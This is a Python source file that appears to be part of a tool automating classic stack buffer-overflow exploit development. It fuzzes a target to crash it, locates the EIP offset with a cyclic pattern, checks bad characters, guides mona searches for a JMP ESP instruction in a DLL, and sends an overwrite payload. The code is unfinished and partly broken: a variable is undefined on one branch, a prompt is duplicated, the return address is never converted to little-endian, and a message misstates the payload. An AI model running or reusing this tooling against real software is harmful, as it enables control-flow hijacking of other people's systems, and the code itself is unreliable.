from bad_characters import bad_characters
from create_pattern import Pattern
from fuzzer import Fuzz


class Enum:

    def __init__(self):
        self.pattern = Pattern()

    def enumerate(self, args, target):

        if args.eip:
            fuzz = Fuzz(target)

            fuzz_length = args.len if args.len else 100

            # bytes to crash program
            crash_bytes = fuzz.find_crash(fuzz_length)
            print(f"[*] Program crashed at {crash_bytes} bytes...\n")

            pat = self.get_pattern(crash_bytes)

            print("[*] Pattern created\n")

            # Reset application
            self.print_restart_message()
            fuzz.is_target_up()

            # Send pattern to application to identify EIP overwrite
            fuzz.locate_eip(pat)

            # Get EIP value from user
            eip_query = input("[?] Enter EIP Value: ").strip()

            self.print_restart_message()
            fuzz.is_target_up()

            # Determine EIP offset
            offset = self.get_offset(eip_query)
            print(f"[*] Offset detected at {offset} bytes\n")
        else:
            offset = args.eip
            print(f"[*] Offset set at {offset} bytes\n")
        

        print("[*] Targeting EIP with all 'B's...\n")
        fuzz.send_payload("A" * offset + "B" * 4)

        self.print_restart_message()
        fuzz.is_target_up()

        print("[*] Sending all chars for bad char check...\n")
        fuzz.send_payload("A" * offset + "B" * 4 + bad_characters())

        bad_char_esp = input(f"[?] Enter start ESP of bad characters: ")
        print('\n[-] Run: !mona bytearray -b "\\x00"\n')
        print(f"[-] Run: '!mona compare -f bytearray.bin -a {bad_char_esp}'\n")


        print(f"Run: '!mona modules'\n")
        dll = input("Enter target DLL: ")

        print(f"Run: '!mona modules'\n")
        dll = input("Enter target DLL: ").strip()


        print(f"\n[-] Run: '!mona find -s '\\xff\\xe4' -m {dll}'\n")

        dll_mem = input("[?] Enter target DLL Memory Location: ").strip()

        self.print_restart_message()
        fuzz.is_target_up()

        print("\n[*] Launching Test Payload...")
        print("[*] Sending buffer + 4 * 'B' + 390 * 'C'\n")
        fuzz.send_payload("A" * offset + dll_mem + "C" * (3500 - offset - 4))
        # Resolve memory address to little endian
        # continue here?

    def get_pattern(self, crash_bytes):
        # Create pattern from crash bytes plus 300 byte padding
        return self.pattern.create_pattern(crash_bytes + 300)

    def get_offset(self, eip_query):
        # Find position of EIP query in string
        # NOTE: Decodes EIP hex to ascii before passing
        # Reverses result due to little endianness
        clear_text = bytearray.fromhex(eip_query).decode()[::-1]
        return self.pattern.find_offset(clear_text)
    
    def print_restart_message(self):
        print("[!] Waiting for application to restart.\n")
